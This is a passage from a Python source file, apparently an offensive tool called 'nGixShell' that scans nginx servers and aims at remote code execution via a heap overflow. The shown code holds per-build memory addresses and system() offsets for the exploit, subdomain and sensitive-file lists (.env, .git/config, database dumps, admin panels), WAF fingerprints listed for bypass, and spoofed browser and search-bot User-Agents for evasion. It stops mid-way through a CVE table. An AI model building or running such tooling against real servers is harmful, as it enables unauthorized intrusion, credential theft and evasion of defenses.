#!/usr/bin/env python3
"""
nGixShell — nginx CVE scanner + RCE exploit framework
CVE-2026-42945 heap overflow + 52 other nginx vulnerabilities.
"""

BANNER = r"""
╔════════════════════════════════════════════════════════╗
║          _______      _____ __         ____            ║
║   ____  / ____(_)  __/ ___// /_  ___  / / /           ║
║  / __ \/ / __/ / |/_/\__ \/ __ \/ _ \/ / /            ║
║ / / / / /_/ / />  < ___/ / / / /  __/ / /             ║
║/_/ /_/\____/_/_/|_|/____/_/ /_/\___/_/_/              ║
╠════════════════════════════════════════════════════════╣
║  nginx CVE Scanner + RCE Exploit Framework             ║
║  53 CVEs  ·  CVE-2026-42945  ·  by Mateus Veras        ║
╚════════════════════════════════════════════════════════╝
"""
import argparse
import base64
import datetime
import json
import random
import re
import select
import shutil
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# ─── Safe-byte filter (NGX_ESCAPE_ARGS bitmask from nginx source) ─────────────
SAFE = set()
_t = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
      0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
for _b in range(256):
    if not (_t[_b >> 5] & (1 << (_b & 0x1f))):
        SAFE.add(_b)

# ─── Exploit constants ────────────────────────────────────────────────────────
# Per-build database: maps nginx "Server:" version string → (HEAP_BASE, LIBC_BASE,
# system_offset, PREREAD_HEAP_OFFSETS). Requires ASLR disabled on target.
# Compute new entries with: python3 calibrate.py <host> <port> <worker_pid>
KNOWN_BUILDS: dict = {
    # nginx/1.25.3 — Docker nginx:1.25.3 (glibc/Debian, x86_64)
    "nginx/1.25.3-glibc": {
        "heap_base":  0x5555556cc000,
        "libc_base":  0x7ffff77bb000,
        "sys_offset": 0x4c490,
        "offsets": [
            0x05a427, 0x060e67,
            0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
            0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
            0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
            0x103847, 0x108657, 0x10d467,
        ],
    },
    # nginx/1.29.5 — Docker nginx:1.29.5 (glibc/Debian, x86_64)
    "nginx/1.29.5-glibc": {
        "heap_base":  0x5555556e6000,
        "libc_base":  0x7ffff7573000,
        "sys_offset": 0x53110,
        "offsets": [
            0x05a427, 0x060e67,
            0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
            0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
            0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
            0x103847, 0x108657, 0x10d467,
        ],
    },
    # nginx/1.26.3 — Docker nginx:1.26-alpine-slim (musl/Alpine, x86_64)
    "nginx/1.26.3-musl": {
        "heap_base":  0x555555686000,
        "libc_base":  0x7ffff7f5c000,
        "sys_offset": 0x449fd,
        "offsets": [
            0x05a427, 0x060e67,
            0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
            0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
            0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
            0x103847, 0x108657, 0x10d467,
        ],
    },
    # Generic fallback — original research values (ASLR off, specific build)
    "_default": {
        "heap_base":  0x555555659000,
        "libc_base":  0x7ffff77ba000,
        "sys_offset": 0x50d70,
        "offsets": [
            0x05a427, 0x060e67,
            0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
            0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
            0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
            0x103847, 0x108657, 0x10d467,
        ],
    },
}

# Active constants (may be overridden by CLI flags or auto-selected by version)
_build      = KNOWN_BUILDS["_default"]
HEAP_BASE   = _build["heap_base"]
LIBC_BASE   = _build["libc_base"]
SYSTEM_ADDR = LIBC_BASE + _build["sys_offset"]

FAKE_STRUCT_SIZE = struct.calcsize('<QQQ')

PREREAD_HEAP_OFFSETS = _build["offsets"][:]


def _apply_build(build_key: str | None, *, heap_base=None, libc_base=None,
                 system_addr=None, offsets=None) -> None:
    """Apply a known build profile or CLI overrides to the active constants."""
    global HEAP_BASE, LIBC_BASE, SYSTEM_ADDR, PREREAD_HEAP_OFFSETS
    if build_key and build_key in KNOWN_BUILDS:
        b = KNOWN_BUILDS[build_key]
        HEAP_BASE   = b["heap_base"]
        LIBC_BASE   = b["libc_base"]
        SYSTEM_ADDR = LIBC_BASE + b["sys_offset"]
        PREREAD_HEAP_OFFSETS = b["offsets"][:]
    if heap_base   is not None: HEAP_BASE   = heap_base
    if libc_base   is not None: LIBC_BASE   = libc_base
    if system_addr is not None: SYSTEM_ADDR = system_addr
    if offsets     is not None: PREREAD_HEAP_OFFSETS = offsets[:]


def _auto_select_build(version_str: str) -> str | None:
    """Pick the best known-build key from the fingerprinted Server: header."""
    for key in KNOWN_BUILDS:
        if key == "_default": continue
        ver_part = key.rsplit("-", 1)[0]   # e.g. "nginx/1.25.3"
        if ver_part in version_str:
            return key
    return None

VULN_MIN = (0, 6, 27)
VULN_MAX = (1, 30, 0)

COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "api", "dev", "test", "staging", "app", "admin",
    "blog", "shop", "cdn", "static", "media", "assets", "images", "img",
    "upload", "downloads", "secure", "vpn", "remote", "portal", "login",
    "auth", "oauth", "sso", "payment", "checkout", "store", "m", "mobile",
    "beta", "demo", "dashboard", "status", "monitor", "metrics", "grafana",
    "jenkins", "gitlab", "git", "svn", "jira", "confluence", "wiki", "docs",
    "help", "support", "kb", "forum", "community", "chat", "news", "press",
    "careers", "jobs", "hr", "intranet", "internal", "corp", "office",
    "backup", "db", "database", "redis", "elastic", "search", "proxy",
    "gateway", "lb", "ha", "k8s", "docker", "registry", "ci", "cd",
    "build", "deploy", "prod", "uat", "qa", "sandbox", "lab", "data",
    "analytics", "bi", "reporting", "mq", "kafka", "ws", "websocket",
    "ns1", "ns2", "smtp", "webmail", "autodiscover", "cpanel", "panel",
    "externo", "external", "ext", "public", "open", "access", "v2", "v1",
    "api2", "api3", "old", "new", "legacy", "cloud", "aws", "azure",
]

# ─── Web audit constants ───────────────────────────────────────────────────────

# (header-name, short-label, issue-description, https-only)
SECURITY_HEADERS = [
    ("strict-transport-security", "HSTS",
     "Missing HSTS — allows HTTP downgrade attacks", True),
    ("content-security-policy", "CSP",
     "Missing Content-Security-Policy — XSS risk", False),
    ("x-frame-options", "X-Frame-Options",
     "Missing X-Frame-Options — clickjacking risk", False),
    ("x-content-type-options", "X-Content-Type-Options",
     "Missing X-Content-Type-Options: nosniff — MIME sniffing risk", False),
    ("referrer-policy", "Referrer-Policy",
     "Missing Referrer-Policy — information disclosure risk", False),
    ("permissions-policy", "Permissions-Policy",
     "Missing Permissions-Policy — feature access not restricted", False),
]

LEAK_HEADERS = [
    "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version",
    "x-generator", "x-drupal-cache", "x-varnish",
]

# Paths to probe — mix of nginx-specific, common misconfigs, and sensitive files
INTERESTING_PATHS = [
    # nginx
    ("/nginx_status",          "nginx stub_status module"),
    ("/nginx-status",          "nginx stub_status (alt path)"),
    # Env / config leaks
    ("/.env",                  "Environment file"),
    ("/.env.local",            "Environment file (local)"),
    ("/.env.production",       "Environment file (production)"),
    ("/.env.backup",           "Environment backup"),
    ("/.git/config",           "Git repository config"),
    ("/.git/HEAD",             "Git repository HEAD"),
    ("/config.json",           "JSON config file"),
    ("/config.yml",            "YAML config file"),
    ("/config.php",            "PHP config file"),
    ("/web.config",            "IIS/ASP.NET config"),
    # Backups
    ("/backup.zip",            "Backup archive"),
    ("/backup.tar.gz",         "Backup archive"),
    ("/backup.sql",            "Database dump"),
    ("/dump.sql",              "Database dump"),
    # Admin panels
    ("/admin",                 "Admin panel"),
    ("/admin/",                "Admin panel"),
    ("/administrator",         "Admin panel"),
    ("/wp-admin/",             "WordPress admin"),
    ("/wp-login.php",          "WordPress login"),
    ("/phpmyadmin/",           "phpMyAdmin"),
    ("/pma/",                  "phpMyAdmin (alt)"),
    ("/cpanel/",               "cPanel"),
    # API / documentation
    ("/api/",                  "API root"),
    ("/api/v1/",               "API v1"),
    ("/api/v2/",               "API v2"),
    ("/swagger",               "Swagger UI"),
    ("/swagger-ui.html",       "Swagger UI"),
    ("/swagger-ui/",           "Swagger UI"),
    ("/api-docs",              "API docs"),
    ("/openapi.json",          "OpenAPI spec"),
    ("/graphql",               "GraphQL endpoint"),
    ("/graphiql",              "GraphiQL IDE"),
    # Monitoring / health
    ("/metrics",               "Prometheus metrics"),
    ("/actuator",              "Spring Boot actuator"),
    ("/actuator/health",       "Spring Boot health"),
    ("/actuator/env",          "Spring Boot env (sensitive)"),
    ("/actuator/mappings",     "Spring Boot route mappings"),
    ("/health",                "Health endpoint"),
    ("/healthz",               "Health endpoint"),
    ("/ping",                  "Ping endpoint"),
    ("/server-status",         "Apache/nginx server status"),
    ("/server-info",           "Apache server info"),
    # Debug / info
    ("/phpinfo.php",           "PHP info page"),
    ("/info.php",              "PHP info page"),
    ("/test.php",              "PHP test page"),
    ("/_profiler",             "Symfony profiler"),
    ("/debug",                 "Debug endpoint"),
    # Standard
    ("/robots.txt",            "Robots file"),
    ("/sitemap.xml",           "Sitemap"),
    ("/.well-known/security.txt", "Security contact info"),
]

# Virtual host candidates to enumerate
COMMON_VHOSTS = [
    "localhost", "127.0.0.1",
    "admin", "internal", "intranet", "corp",
    "dev", "test", "staging", "beta",
    "api", "backend", "management",
    "monitor", "dashboard", "portal",
]

# ─── WAF bypass constants ─────────────────────────────────────────────────────

# Known WAF signatures — checked against response headers, server string, and body
WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
        "server":  ["cloudflare"],
        "cookies": ["__cfduid", "__cf_bm"],
        "body":    ["cloudflare", "attention required! | cloudflare"],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid", "x-amzn-trace-id", "x-amz-cf-id"],
        "server":  [],
        "cookies": ["awsalb", "awsalbcors"],
        "body":    ["aws waf", "request blocked"],
    },
    "Akamai": {
        "headers": ["x-akamai-transformed", "x-check-cacheable", "x-akamai-request-id"],
        "server":  ["akamaighost", "akamai"],
        "cookies": ["ak_bmsc", "bm_sz"],
        "body":    ["access denied | akamai"],
    },
    "Imperva / Incapsula": {
        "headers": ["x-iinfo", "x-cdn"],
        "server":  ["incapsula"],
        "cookies": ["incap_ses", "visid_incap"],
        "body":    ["incapsula incident id", "_incap_"],
    },
    "ModSecurity": {
        "headers": [],
        "server":  ["mod_security", "modsecurity"],
        "cookies": [],
        "body":    ["modsecurity", "naxsi", "not acceptable!", "this error was generated by mod_security"],
    },
    "F5 BIG-IP ASM": {
        "headers": [],
        "server":  ["bigip"],
        "cookies": ["ts", "tsrce", "f5_cspm"],
        "body":    ["the requested url was rejected", "please consult with your administrator"],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "server":  ["sucuri"],
        "cookies": [],
        "body":    ["sucuri website firewall", "access denied - sucuri"],
    },
    "Barracuda": {
        "headers": ["x-barracuda-connect"],
        "server":  [],
        "cookies": ["barra_counter_session"],
        "body":    ["barracuda networks", "barra_"],
    },
    "Nginx WAF / NAXSI": {
        "headers": [],
        "server":  [],
        "cookies": [],
        "body":    ["naxsi", "naxsi_fmt", "libinjection"],
    },
    "Fastly": {
        "headers": ["x-fastly-request-id", "fastly-io-info", "x-served-by"],
        "server":  [],
        "cookies": [],
        "body":    [],
    },
    "Wordfence": {
        "headers": [],
        "server":  [],
        "cookies": [],
        "body":    ["generated by wordfence", "wordfence central"],
    },
}

# Realistic browser User-Agents for rotation
BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

# ─── CVE Database ─────────────────────────────────────────────────────────────
CVE_DB = OrderedDict([
    ("CVE-2026-42945", {
        "description": "Heap overflow in ngx_http_rewrite_module via URI percent-encoding mismatch (RCE)",
        "cvss": 9.8, "severity": "CRITICAL",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": ["rewrite", "set"],
        "local_only": False, "probe": None, "exploit": True,
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2026-42946", {
        "description": "Memory corruption in nginx rewrite engine (sibling of CVE-2026-42945)",
        "cvss": 8.1, "severity": "HIGH",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": ["rewrite"],
        "local_only": False, "probe": None, "exploit": False,
        "same_advisory_as": "CVE-2026-42945",
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2026-40701", {
        "description": "Memory corruption in nginx request processing (sibling of CVE-2026-42945)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "same_advisory_as": "CVE-2026-42945",
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2026-42934", {
        "description": "Memory corruption in nginx (sibling of CVE-2026-42945, same advisory)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "same_advisory_as": "CVE-2026-42945",
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2022-41741", {
        "description": "Memory corruption in ngx_http_mp4_module via malicious mp4 file (RCE)",
        "cvss": 7.8, "severity": "HIGH",
        "affected_min": (1, 1, 3), "affected_max": (1, 23, 1),
        "fixed_in": "1.23.2 / 1.22.1",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2022-41742", {
        "description": "Heap memory disclosure in ngx_http_mp4_module via malicious mp4 file",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 1, 3), "affected_max": (1, 23, 1),
        "fixed_in": "1.23.2 / 1.22.1",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2021-23017", {
        "description": "Off-by-one in DNS resolver allows 1-byte heap overwrite (potential RCE)",
        "cvss": 7.7, "severity": "HIGH",
        "affected_min": (0, 6, 18), "affected_max": (1, 20, 0),
        "fixed_in": "1.20.1",
        "config_required": ["resolver"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2017-7529", {
        "description": "Integer overflow in range filter allows out-of-bounds memory read",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 5, 6), "affected_max": (1, 13, 2),
        "fixed_in": "1.13.3 / 1.12.1",
        "config_required": [],
        "local_only": False, "probe": "probe_range_overflow", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2016-1247", {
        "description": "Privilege escalation via log file symlink attack (local, packaging issue)",
        "cvss": 7.8, "severity": "HIGH",
        "affected_min": (0, 0, 0), "affected_max": (1, 10, 0),
        "fixed_in": "1.10.1 (distro-specific)",
        "config_required": [],
        "local_only": True, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2013-4547", {
        "description": "Space + NUL byte in URI bypasses location access restrictions",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 8, 41), "affected_max": (1, 5, 6),
        "fixed_in": "1.5.7 / 1.4.4",
        "config_required": [],
        "local_only": False, "probe": "probe_uri_space", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2013-2028", {
        "description": "Stack-based buffer overflow in chunked transfer encoding (RCE)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 3, 9), "affected_max": (1, 4, 0),
        "fixed_in": "1.4.1",
        "config_required": [],
        "local_only": False, "probe": "probe_chunked", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2012-2089", {
        "description": "Buffer overflow in ngx_http_mp4_module via malicious mp4 request",
        "cvss": 6.8, "severity": "MEDIUM",
        "affected_min": (1, 0, 7), "affected_max": (1, 1, 3),
        "fixed_in": "1.1.19 / 1.0.15",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2019-20372", {
        "description": "HTTP request smuggling via error_page + proxy_pass configuration",
        "cvss": 5.3, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (1, 17, 6),
        "fixed_in": "1.17.7",
        "config_required": ["error_page", "proxy_pass"],
        "local_only": False, "probe": "probe_smuggling", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2014-3616", {
        "description": "Virtual host confusion via TLS SNI — wrong certificate may be served",
        "cvss": 4.3, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (1, 7, 3),
        "fixed_in": "1.7.4",
        "config_required": ["ssl", "server_name"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2011-4963", {
        "description": "ngx_http_access_module bypass via IPv6 address literal in Host header",
        "cvss": 5.0, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (1, 1, 18),
        "fixed_in": "1.1.19 / 1.0.14",
        "config_required": ["deny", "allow"],
        "local_only": False, "probe": "probe_ipv6_bypass", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2009-3896", {
        "description": "NULL pointer dereference via crafted request — remote crash (DoS)",
        "cvss": 5.0, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (0, 8, 31),
        "fixed_in": "0.8.32 / 0.7.64",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2009-2629", {
        "description": "Buffer underflow in ngx_http_parse_complex_uri() — remote crash/RCE",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 0, 0), "affected_max": (0, 8, 14),
        "fixed_in": "0.8.15 / 0.7.62",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    # ── 2026 additional CVEs ────────────────────────────────────────────────────
    ("CVE-2026-42926", {
        "description": "HTTP/2 request splitting via proxy allows response injection",
        "cvss": 6.5, "severity": "MEDIUM",
        "affected_min": (1, 29, 4), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": ["proxy_pass"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2026-40460", {
        "description": "HTTP/3 QUIC connection spoofing via crafted packet",
        "cvss": 5.3, "severity": "MEDIUM",
        "affected_min": (1, 25, 0), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": ["http3"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2026-27784", {
        "description": "Buffer overflow in ngx_http_mp4_module via crafted mp4 file",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 1, 19), "affected_max": (1, 29, 6),
        "fixed_in": "1.30.0 / 1.29.7",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2026-32647", {
        "description": "Buffer overflow in ngx_http_mp4_module (sibling of CVE-2026-27784)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 1, 19), "affected_max": (1, 29, 6),
        "fixed_in": "1.30.0 / 1.29.7",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "same_advisory_as": "CVE-2026-27784",
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2026-27654", {
        "description": "Heap buffer overflow in ngx_http_dav_module via crafted request body",
        "cvss": 6.5, "severity": "MEDIUM",
        "affected_min": (0, 5, 13), "affected_max": (1, 29, 6),
        "fixed_in": "1.30.0 / 1.29.7",
        "config_required": ["dav"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2026-27651", {
        "description": "NULL pointer dereference in nginx mail proxy (DoS)",
        "cvss": 4.3, "severity": "MEDIUM",
        "affected_min": (0, 5, 15), "affected_max": (1, 29, 6),
        "fixed_in": "1.30.0 / 1.29.7",
        "config_required": ["mail"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2026-28753", {
        "description": "Header injection in nginx mail proxy via crafted SMTP response",
        "cvss": 6.5, "severity": "MEDIUM",
        "affected_min": (0, 6, 27), "affected_max": (1, 29, 6),
        "fixed_in": "1.30.0 / 1.29.7",
        "config_required": ["mail"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2026-28755", {
        "description": "Memory disclosure in OCSP response processing via crafted TLS stream",
        "cvss": 5.3, "severity": "MEDIUM",
        "affected_min": (1, 27, 2), "affected_max": (1, 29, 6),
        "fixed_in": "1.30.0 / 1.29.7",
        "config_required": ["ssl", "ssl_stapling"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2026-1642", {
        "description": "SSL upstream session reuse may expose data to wrong client",
        "cvss": 6.5, "severity": "MEDIUM",
        "affected_min": (1, 3, 0), "affected_max": (1, 29, 4),
        "fixed_in": "1.29.5",
        "config_required": ["proxy_pass", "ssl"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    # ── 2025 CVEs ───────────────────────────────────────────────────────────────
    ("CVE-2025-53859", {
        "description": "Mail proxy SMTP command injection via crafted AUTH response",
        "cvss": 4.3, "severity": "MEDIUM",
        "affected_min": (0, 7, 22), "affected_max": (1, 29, 0),
        "fixed_in": "1.29.1 / 1.28.1",
        "config_required": ["mail"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2025-23419", {
        "description": "TLS session resumption may allow bypass of client certificate auth",
        "cvss": 5.3, "severity": "MEDIUM",
        "affected_min": (1, 11, 4), "affected_max": (1, 27, 3),
        "fixed_in": "1.27.4 / 1.26.3",
        "config_required": ["ssl", "ssl_verify_client"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    # ── 2024 CVEs ───────────────────────────────────────────────────────────────
    ("CVE-2024-24990", {
        "description": "Use-after-free in HTTP/3 QUIC module — remote crash (DoS) or RCE",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 25, 0), "affected_max": (1, 25, 3),
        "fixed_in": "1.25.4 / 1.26.0",
        "config_required": ["http3"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2024-24989", {
        "description": "NULL pointer dereference in HTTP/3 QUIC module — remote crash (DoS)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 25, 3), "affected_max": (1, 25, 3),
        "fixed_in": "1.25.4 / 1.26.0",
        "config_required": ["http3"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2024-31079", {
        "description": "Stack overflow in HTTP/3 QUIC encoder — remote crash",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 25, 0), "affected_max": (1, 26, 0),
        "fixed_in": "1.27.0 / 1.26.1",
        "config_required": ["http3"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2024-32760", {
        "description": "Buffer overwrite in HTTP/3 QUIC module via HEADERS frame",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 25, 0), "affected_max": (1, 26, 0),
        "fixed_in": "1.27.0 / 1.26.1",
        "config_required": ["http3"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2024-35200", {
        "description": "NULL pointer dereference in HTTP/3 QUIC module via undisclosed request",
        "cvss": 5.3, "severity": "MEDIUM",
        "affected_min": (1, 25, 0), "affected_max": (1, 26, 0),
        "fixed_in": "1.27.0 / 1.26.1",
        "config_required": ["http3"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2024-34161", {
        "description": "Memory disclosure in HTTP/3 QUIC module via undisclosed request",
        "cvss": 5.3, "severity": "MEDIUM",
        "affected_min": (1, 25, 0), "affected_max": (1, 26, 0),
        "fixed_in": "1.27.0 / 1.26.1",
        "config_required": ["http3"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2024-7347", {
        "description": "Out-of-bounds read in ngx_http_mp4_module via crafted mp4 file",
        "cvss": 4.7, "severity": "MEDIUM",
        "affected_min": (1, 5, 13), "affected_max": (1, 27, 0),
        "fixed_in": "1.27.1 / 1.26.2",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    # ── 2019 HTTP/2 DoS CVEs ────────────────────────────────────────────────────
    ("CVE-2019-9511", {
        "description": "HTTP/2 Data Dribble — window-size manipulation causes excessive CPU/memory DoS",
        "cvss": 6.5, "severity": "MEDIUM",
        "affected_min": (1, 9, 5), "affected_max": (1, 17, 2),
        "fixed_in": "1.17.3 / 1.16.1",
        "config_required": ["http2"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2019-9513", {
        "description": "HTTP/2 Resource Loop — priority change flood causes CPU DoS",
        "cvss": 4.3, "severity": "MEDIUM",
        "affected_min": (1, 9, 5), "affected_max": (1, 17, 2),
        "fixed_in": "1.17.3 / 1.16.1",
        "config_required": ["http2"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2019-9516", {
        "description": "HTTP/2 0-Length Headers Leak — headers with 0-length cause memory exhaustion",
        "cvss": 4.3, "severity": "MEDIUM",
        "affected_min": (1, 9, 5), "affected_max": (1, 17, 2),
        "fixed_in": "1.17.3 / 1.16.1",
        "config_required": ["http2"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    # ── 2018 CVEs ───────────────────────────────────────────────────────────────
    ("CVE-2018-16843", {
        "description": "Excessive memory consumption in HTTP/2 implementation — DoS",
        "cvss": 4.3, "severity": "MEDIUM",
        "affected_min": (1, 9, 5), "affected_max": (1, 15, 5),
        "fixed_in": "1.15.6 / 1.14.1",
        "config_required": ["http2"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2018-16844", {
        "description": "Excessive CPU usage in HTTP/2 implementation via SETTINGS frames — DoS",
        "cvss": 4.3, "severity": "MEDIUM",
        "affected_min": (1, 9, 5), "affected_max": (1, 15, 5),
        "fixed_in": "1.15.6 / 1.14.1",
        "config_required": ["http2"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2018-16845", {
        "description": "Integer underflow in ngx_http_mp4_module causes worker crash and memory disclosure",
        "cvss": 5.5, "severity": "MEDIUM",
        "affected_min": (1, 1, 3), "affected_max": (1, 15, 5),
        "fixed_in": "1.15.6 / 1.14.1",
        "config_required": ["mp4"],
